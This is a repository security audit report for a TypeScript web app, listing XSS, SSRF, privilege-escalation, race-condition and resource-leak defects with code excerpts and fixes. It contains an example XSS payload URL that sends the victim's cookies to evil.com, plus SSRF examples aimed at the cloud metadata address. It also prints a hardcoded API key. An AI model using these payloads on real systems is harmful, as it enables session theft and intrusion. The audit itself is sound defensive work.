# 🛡️ Full Repository Audit: bugs.md

> **Branch audited:** `staging`
> **Audit date:** 2026-04-14
> **Scope:** Every `.ts` source file under `src/` — routes, services, spindle, auth, utils, ws, llm, image-gen, crypto, db, macros, migration

---

## 🔴 HIGH SEVERITY

---

### `src/routes/google-drive.routes.ts` (Lines 170–171)

**Defect:** DOM-based Cross-Site Scripting (XSS) in the Google Drive OAuth landing page.

The `/api/v1/google-drive/oauth-landing` endpoint is **unauthenticated** (the middleware explicitly skips it: `if (c.req.path.endsWith("/oauth-landing")) return next()`). It serves an HTML page that reads the `error` query parameter via `params.get("error")` and injects it into the DOM without sanitization:

```js
// Line 170-171 (inside a <script> block in server-rendered HTML)
document.body.innerHTML = error
  ? "<p>Authorization failed: " + error + "</p>"
  : "<p>Authorization complete. You can close this window.</p>";
```

An attacker can craft a URL such as:
```
/api/v1/google-drive/oauth-landing?error=<img src=x onerror="fetch('https://evil.com/?c='+encodeURIComponent(document.cookie))">
```
Because this page is unauthenticated, any victim who clicks such a link (e.g., from a phishing email or forwarded link) will execute the injected script in the Lumiverse origin's security context.

**Impact:** Arbitrary JavaScript execution in the Lumiverse origin. An attacker can steal session cookies, exfiltrate auth tokens, perform actions on behalf of any logged-in user who loads the crafted URL, or silently escalate privileges.

**Fix:**
```typescript
// Replace the innerHTML concatenation with safe DOM API calls or escape the value.
// Option A — textContent (safe, no HTML):
document.body.textContent = error
  ? "Authorization failed: " + error
  : "Authorization complete. You can close this window.";

// Option B — escape before injecting (if HTML structure is required):
function escapeHtml(str) {
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;")
            .replace(/>/g, "&gt;").replace(/"/g, "&quot;")
            .replace(/'/g, "&#39;");
}
document.body.innerHTML = error
  ? "<p>Authorization failed: " + escapeHtml(error) + "</p>"
  : "<p>Authorization complete. You can close this window.</p>";
```
The Spindle OAuth callback (`src/routes/spindle-oauth.routes.ts`) correctly uses a server-side `escapeHtml()` helper — apply the same pattern here.

---

### `src/routes/users.routes.ts` (Lines 89–90)

**Defect:** Unrestricted role assignment allows privilege escalation to `"owner"`.

When an admin/owner creates a new user via `POST /api/v1/users`, the `body.role` field is accepted and applied without any allowlist validation:

```typescript
// Line 89-90
if (body.role && body.role !== "user") {
  getDb().run('UPDATE "user" SET role = ? WHERE id = ?', [body.role, newUser.user.id]);
}
```

The guard only prevents setting the role to `"user"`, but permits `"owner"`, `"admin"`, or **any arbitrary string**. An authenticated admin (non-owner) calling this endpoint can promote any new account to `"owner"` — bypassing the single-owner model that the entire application is designed around. Even if the endpoint requires `requireOwner`, an existing owner can mint unlimited new owners, breaking the privileged-singleton intent and any downstream audit/permission check.

**Impact:** Any authenticated owner/admin can create additional `"owner"`-tier accounts. The `"owner"` role unlocks the broadest set of capabilities (system routes, operator, LumiHub link/unlink, spindle pool management, etc.). This undermines the single-owner security model.

**Fix:**
```typescript
// Define an explicit allowlist of valid roles
const VALID_ROLES = new Set(["user", "admin"]);
// Only "owner" can assign "admin"; no one can assign "owner" via this API.

if (body.role && body.role !== "user") {
  if (!VALID_ROLES.has(body.role)) {
    return c.json({ error: `Invalid role. Allowed: ${[...VALID_ROLES].join(", ")}` }, 400);
  }
  getDb().run('UPDATE "user" SET role = ? WHERE id = ?', [body.role, newUser.user.id]);
}
```

---

### `src/app.ts` (Line 141)

**Defect:** OpenRouter OAuth authorization code broadcast to all origins via wildcard `postMessage`.

The OpenRouter OAuth landing page sends the authorization code using `'*'` as the target origin:

```js
// Line 141
window.opener.postMessage({ type: 'openrouter_oauth_code', code: code }, '*');
```

Any page that has a reference to this popup (e.g., a malicious tab that opened it, or an XSS on a co-hosted page) can receive the OAuth code. Because the PKCE `code_verifier` is stored server-side, the raw code alone cannot complete the exchange — however, the intended recipient (the Lumiverse frontend) holds the matching `session_token`. If the Lumiverse frontend origin can be compromised via XSS (e.g., via the bug above), the `'*'` target means the code is freely interceptable.

Contrast this with the Google Drive OAuth callback in `google-drive.routes.ts` which correctly uses `window.location.origin` as the target:
```js
window.opener.postMessage({ ... }, window.location.origin);  // correct
```

**Impact:** OAuth code interception by any same-tab or cross-origin attacker who can position a page as the opener. Combined with the XSS finding above, this is a complete OAuth code theft path.

**Fix:**
```typescript
// In app.ts around line 141, replace '*' with the server's own origin so only
// the Lumiverse frontend tab can receive the message.
window.opener.postMessage({ type: 'openrouter_oauth_code', code: code }, window.location.origin);
```

---

### `src/routes/lumihub.routes.ts` (Lines 63–64, 91)

**Defect:** SSRF — user-controlled `lumihubUrl` and `ws_url` used for server-side requests without SSRF validation.

When a user initiates LumiHub linking (`POST /api/v1/lumihub/link`, owner-only), they supply a `lumihub_url`. This URL is stored in the PKCE state map. On the unauthenticated callback (`GET /api/v1/lumihub/callback`), the server fetches that URL server-side without calling `validateHost()`:

```typescript
// Line 63-64
const tokenUrl = `${pkceState.lumihubUrl}/api/v1/link/token`;
const response = await fetch(tokenUrl, { method: "POST", ... });
```

And then the `ws_url` returned by that server response is used directly to open a WebSocket connection, also without validation:

```typescript
// Line 91
client.connect(data.ws_url, data.token);
```

An authenticated owner can supply `lumihub_url=http://169.254.169.254/latest` (AWS metadata) or any internal service address. The resulting fetch is made from the Lumiverse server. The `ws_url` SSRF is additionally dangerous because the WebSocket client reconnects indefinitely with exponential backoff, turning this into a persistent internal-service probe.

**Impact:** Server-Side Request Forgery. An owner can force the server to make HTTP and WebSocket connections to any internal or cloud-metadata endpoint (AWS IMDS, Docker host gateway, other internal APIs). Credentials or tokens from those services may be returned in the `tokenUrl` response, which the server then logs or stores.

**Fix:**
```typescript
import { validateHost, SSRFError } from "../utils/safe-fetch";

// In the /link handler, validate lumihubUrl before storing it:
let parsedHub: URL;
try {
  parsedHub = new URL(lumihubUrl);
  if (parsedHub.protocol !== "https:" && parsedHub.protocol !== "http:") {
    return c.json({ error: "lumihub_url must use http or https" }, 400);
  }
} catch {
  return c.json({ error: "lumihub_url is not a valid URL" }, 400);
}
try {
  await validateHost(parsedHub.hostname);
} catch (e) {
  return c.json({ error: "lumihub_url resolves to a blocked address" }, 400);
}

// In the callback, also validate ws_url before connecting:
const wsUrlParsed = new URL(data.ws_url);
await validateHost(wsUrlParsed.hostname);
client.connect(data.ws_url, data.token);
```

---

## 🟠 MEDIUM SEVERITY

---

### `src/services/push.service.ts` (Line 106) + `src/routes/push.routes.ts` (Line 21)

**Defect:** SSRF via unvalidated Web Push subscription endpoint.

Any authenticated user can register a push subscription with an arbitrary `endpoint` URL (`POST /api/v1/push/subscriptions`). No URL validation is performed at registration time. When the server later delivers a push notification, it fetches the stored endpoint directly:

```typescript
// push.service.ts line 106
const response = await fetch(request.endpoint, {
  method: "POST",
  headers: request.headers,
  body: request.body,
});
```

A malicious authenticated user can register `endpoint: "http://169.254.169.254/latest/meta-data/"` to trigger server-side requests to internal services on every push event.

**Impact:** Any authenticated user (not just owners) can force the server to make POST requests to internal services including AWS metadata, GCP metadata, Docker host, or other services on the internal network. Push notifications are triggered by all users' generation events, so the SSRF fires regularly without requiring additional attacker action.

**Fix:**
```typescript
// In push.routes.ts, validate endpoint before storing:
import { validateHost } from "../utils/safe-fetch";

app.post("/subscriptions", async (c) => {
  const userId = c.get("userId");
  const body = (await c.req.json()) as CreatePushSubscriptionInput;

  if (!body.endpoint || !body.keys?.p256dh || !body.keys?.auth) {
    return c.json({ error: "Missing endpoint or keys" }, 400);
  }

  // Validate the endpoint is a real push service, not an internal address
  try {
    const parsed = new URL(body.endpoint);
    if (parsed.protocol !== "https:") {
      return c.json({ error: "Push endpoint must use HTTPS" }, 400);
    }
    await validateHost(parsed.hostname);
  } catch (e: any) {
    return c.json({ error: "Invalid or blocked push endpoint URL" }, 400);
  }

  const sub = pushSvc.createSubscription(userId, body);
  return c.json(sub, 201);
});
```

---

### `src/services/tokenizer.service.ts` (Lines 143, 168, 176)

**Defect:** SSRF via user-configured tokenizer URL.

Owner-level users can create custom tokenizer configurations (via `POST /api/v1/tokenizers`) with arbitrary `url` and `configUrl` fields. The tokenizer service fetches these URLs without SSRF validation:

```typescript
// Line 143
const resp = await fetch(cfg.url);
// Line 168
const resp = await fetch(cfg.url);
// Line 176
const configResp = await fetch(cfg.configUrl);
```

**Impact:** An owner can configure a tokenizer with `url: "http://internal-service/secret"`. The fetch result is parsed as tokenizer JSON; a well-crafted internal service response could bypass the parse step, and the error message leaks response status details. While limited to owners, this extends their capability to SSRF to arbitrary internal endpoints.

**Fix:**
```typescript
import { validateHost } from "../utils/safe-fetch";

// Before each fetch(cfg.url), add:
const parsedUrl = new URL(cfg.url);
if (parsedUrl.protocol !== "https:" && parsedUrl.protocol !== "http:") {
  throw new Error("Tokenizer URL must use http or https");
}
await validateHost(parsedUrl.hostname);

const resp = await fetch(cfg.url);
```

Apply the same pattern for `cfg.configUrl` on line 176.

---

### `src/auth/index.ts` (Lines 11–26) + `src/routes/users.routes.ts` (Line 77)

**Defect:** Race condition in single-use signup nonce — concurrent user-creation requests can both proceed past the nonce gate.

The signup nonce is stored in two module-level variables:

```typescript
// auth/index.ts lines 11-12
let creationNonce: string | null = null;
let creationNonceExpiry = 0;

export function allowCreation(): string {
  creationNonce = crypto.randomUUID();   // line 15 — overwrites any existing nonce
  creationNonceExpiry = Date.now() + 10_000;
  return creationNonce;
}
```

`allowCreation()` is called synchronously in the route handler before the `await auth.api.signUpEmail()` call. Because signUpEmail is async, the event loop yields after calling `allowCreation()`, allowing a second concurrent POST `/api/v1/users` request to call `allowCreation()` again, overwriting the first nonce. Both requests now share a 10-second valid window, and — since `consumeNonce()` is called inside BetterAuth's synchronous `signUp` hook — there is a narrow window where both can proceed:

- Request A sets nonce X, yields at `await signUpEmail()`
- Request B calls `allowCreation()` → nonce becomes Y (X is lost, A's signup will hit a different nonce)
- If the BetterAuth hook for A runs **before** B sets nonce Y, both succeed

The practical result is that an owner can inadvertently (or intentionally) create users simultaneously without correct nonce serialization.

**Impact:** Two admin-concurrent user-creation calls can both bypass the nonce gate, making it possible to create multiple users in one burst even though the nonce is intended to be single-use. Low exploitation potential (requires owner access), but breaks the intended access control invariant.

**Fix:**
```typescript
// auth/index.ts — wrap nonce lifecycle in a simple async mutex
let _creationLock = false;

export async function withCreationNonce<T>(fn: () => Promise<T>): Promise<T> {
  if (_creationLock) throw new Error("User creation already in progress");
  _creationLock = true;
  creationNonce = crypto.randomUUID();
  creationNonceExpiry = Date.now() + 10_000;
  try {
    return await fn();
  } finally {
    creationNonce = null;
    _creationLock = false;
  }
}
```

Then in `users.routes.ts`:
```typescript
// Replace: allowCreation(); const newUser = await auth.api.signUpEmail({ ... });
// With:
const newUser = await withCreationNonce(() => auth.api.signUpEmail({ body: { ... } }));
```

---

### `src/routes/dropbox.routes.ts` (Lines 67–97) + `src/routes/google-drive.routes.ts` (Lines 69–122)

**Defect:** Unbounded in-memory `pendingSessions` Map — potential memory exhaustion via repeated OAuth initiations.

Both files maintain a module-level `pendingSessions` Map that is only cleaned when `cleanExpired()` is called at the start of `GET /auth`. An authenticated owner who repeatedly hits `GET /auth` without completing the callback accumulates entries. Although the TTL is 5–10 minutes, there is no cap on map size, and cleanup only happens on new initiations (not on a background timer).

**Impact:** If an owner's session is open and a script repeatedly initiates the flow, server memory grows unboundedly. At scale (or with a bugged client that loops), this degrades server stability. Low severity given the owner-only guard, but missing best-practice hygiene.

**Fix:**
```typescript
// Add a cap and a background sweep (similar to ws/tickets.ts pattern):
const MAX_PENDING_SESSIONS = 50;

// In cleanExpired() — also enforce cap:
function cleanExpired() {
  const now = Date.now();
  for (const [token, session] of pendingSessions) {
    if (now - session.createdAt > SESSION_TTL) pendingSessions.delete(token);
  }
}

// In the /auth handler, before pendingSessions.set():
cleanExpired();
if (pendingSessions.size >= MAX_PENDING_SESSIONS) {
  return c.json({ error: "Too many pending OAuth sessions" }, 429);
}
```

---

## 🟡 LOW SEVERITY

---

### `src/services/pagination.ts` (Lines 5–12)

**Defect:** Unbounded `stmtCache` Map — prepared-statement cache grows indefinitely.

`paginatedQuery` builds SQL strings by concatenating `dataSql` with `" LIMIT ? OFFSET ?"` and caches the result in a module-level Map keyed on the full SQL string:

```typescript
const stmtCache = new Map<string, ReturnType<ReturnType<typeof getDb>["query"]>>();
```

All call sites today use static SQL strings, so growth is bounded. However, there is no size limit on the map, and if a future call site constructs dynamic SQL (e.g., including user-derived `ORDER BY` clauses in the key), the cache would grow unboundedly. There is a `clearStmtCache()` export called during graceful shutdown, but not during the lifetime of the server.

**Impact:** Low. Currently benign because all callers use static SQL. Becomes a memory leak if any caller introduces dynamic SQL fragments.

**Fix:** Add a maximum cache size or use an LRU eviction policy:
```typescript
const MAX_STMT_CACHE = 200;

function cachedQuery(sql: string) {
  let stmt = stmtCache.get(sql);
  if (!stmt) {
    if (stmtCache.size >= MAX_STMT_CACHE) {
      // Evict oldest entry
      const firstKey = stmtCache.keys().next().value;
      stmtCache.delete(firstKey);
    }
    stmt = getDb().query(sql);
    stmtCache.set(sql, stmt);
  }
  return stmt;
}
```

---

### `src/spindle/worker-runtime.ts` (Line 98)

**Defect:** `new Function()` compiles extension-supplied string code at runtime.

When an extension registers a macro with a string handler, it is compiled using `new Function`:

```typescript
// Line 98
const compiled = new Function("ctx", `"use strict";\n${def.handler}`) as (ctx: unknown) => unknown;
```

This is intentional by design — extensions are trusted plugins. However, the compiled function executes in the **Worker thread** context, which still has access to `spindle.*` APIs, the event bus, storage, and the CORS proxy (if granted). There is no sandbox preventing the compiled string from accessing Worker globals.

**Impact:** If an extension author (or a compromised pack from the store) registers a malicious macro handler string, it executes with the full permissions of the extension's granted set. This is an intentional design trade-off but should be documented clearly so extension reviewers know string-handler macros have the same trust level as code-handler macros.

**Fix/Recommendation:** Add a comment/warning in the macro registration API documentation stating that string handlers are executed with full extension privilege. Consider sanitizing or linting macro handler strings before compilation if stricter sandboxing is desired, or restrict string-handler macros to a more limited execution context (e.g., a separate nested Worker with no `spindle` global).

---

### `src/routes/lumihub.routes.ts` (Lines 44–57)

**Defect:** Unauthenticated PKCE callback uses linear map scan instead of indexed lookup.

The callback route iterates the entire `pkceStateMap` to find the first non-expired entry:

```typescript
// Lines 44-57
for (const [key, entry] of pkceStateMap) {
  if (Date.now() <= entry.expiresAt) {
    pkceState = entry;
    stateKey = key;
    break;
  }
}
```

If multiple concurrent link attempts are in flight (unlikely but possible), the first valid state is consumed regardless of which user initiated it. The `state` parameter from the OAuth callback is not compared against the stored PKCE state — this is an incomplete CSRF protection pattern.

**Impact:** With multiple simultaneous link attempts (e.g., two admins triggering links at the same time), the callback can be associated with the wrong PKCE state. Low severity given the single-owner model and short TTL, but deviates from the OAuth 2.0 spec which requires the `state` parameter to match.

**Fix:**
```typescript
// Include a `state` parameter in the authorize URL and validate it on callback:
// In /link handler:
const stateId = crypto.randomUUID();
const authorizeUrl = `${lumihubUrl}/api/v1/link/authorize?state=${stateId}&...`;
pkceStateMap.set(stateId, { ... });

// In /callback handler:
const state = c.req.query("state");
if (!state || !pkceStateMap.has(state)) {
  return c.html(errorHtml("Invalid State", "OAuth state mismatch."), 400);
}
pkceState = pkceStateMap.get(state)!;
pkceStateMap.delete(state);
```

---

### `src/routes/characters.routes.ts` (Lines 235–240)

**Defect:** JannyAI presigned download URL validation is TOCTOU-susceptible.

After calling `validateHost(downloadUrl.hostname)` to check that a presigned URL is not an internal address, the code immediately fetches `result.downloadUrl` (a string, not the parsed URL object):

```typescript
// Lines 239-240
await validateHost(downloadUrl.hostname);
const pngRes = await fetch(result.downloadUrl, { signal: AbortSignal.timeout(15_000) });
```

`downloadUrl` is a `new URL(result.downloadUrl)` object derived from the API response. The fetch uses `result.downloadUrl` (the raw string), not `downloadUrl.href`. If the raw string and the parsed URL differ (e.g., due to URL normalization, encoded characters, or a crafted string that passes URL parsing but is interpreted differently by the HTTP client), the validation and the fetch target may diverge.

**Impact:** Very low in practice — Bun's HTTP client uses the same URL parser. Theoretical TOCTOU gap that becomes relevant if URL normalization edge cases are ever exploited.

**Fix:**
```typescript
// Fetch the normalized (parsed) URL, not the raw string:
await validateHost(downloadUrl.hostname);
const pngRes = await fetch(downloadUrl.href, { signal: AbortSignal.timeout(15_000) });
```

---

### `src/services/connections.service.ts` (Lines 125–126)

**Defect:** Module-level prepared statement cache is never invalidated on database reconnection.

```typescript
let _stmtConnById: ReturnType<ReturnType<typeof getDb>["query"]> | null = null;
let _stmtConnDefault: ReturnType<ReturnType<typeof getDb>["query"]> | null = null;
```

These are lazily initialized against `getDb()`. If the database is ever closed and re-opened (e.g., during the WAL checkpoint cycle in maintenance), the cached statement handles would reference the old (closed) database connection and throw on next use. Similar patterns exist in `characters.service.ts`, `chats.service.ts`, `packs.service.ts`, `presets.service.ts`, and `regex-scripts.service.ts`.

**Impact:** Low — the current server lifecycle does not close and reopen the database during normal operation (only at shutdown). Becomes a runtime crash if hot-reload or maintenance-triggered reconnection is introduced.

**Fix:** Either clear module-level statement caches in the `closeDatabase()` path, or use a connection-scoped cache that is invalidated when the DB handle changes.

---

### `src/env.ts` (Line 141) — Hardcoded Default API Key

**Defect:** A default Pollinations `BYOP` app key is hardcoded in the environment loader:

```typescript
// Line 141
const pollinationsAppKey = process.env.POLLINATIONS_APP_KEY || "pk_Y3z2ooD6zSWfLdL3";
```

While the comment notes this is a "publishable" key, committing third-party API keys — even publishable ones — into source code is poor practice. If the key's permissions ever expand, or if Pollinations revokes/replaces it without a source update, the application silently fails. It also appears in public git history.

**Impact:** Low. Publishable keys are by definition public. No immediate security risk, but violates least-exposure principle and creates maintenance risk.

**Fix:** Remove the hardcoded default. Require `POLLINATIONS_APP_KEY` to be set explicitly, or document the fallback behavior with a clear comment indicating the key is intentionally public and is rotatable via environment variable.

---

*End of audit. All source files under `src/` were visited. No files were skipped.*
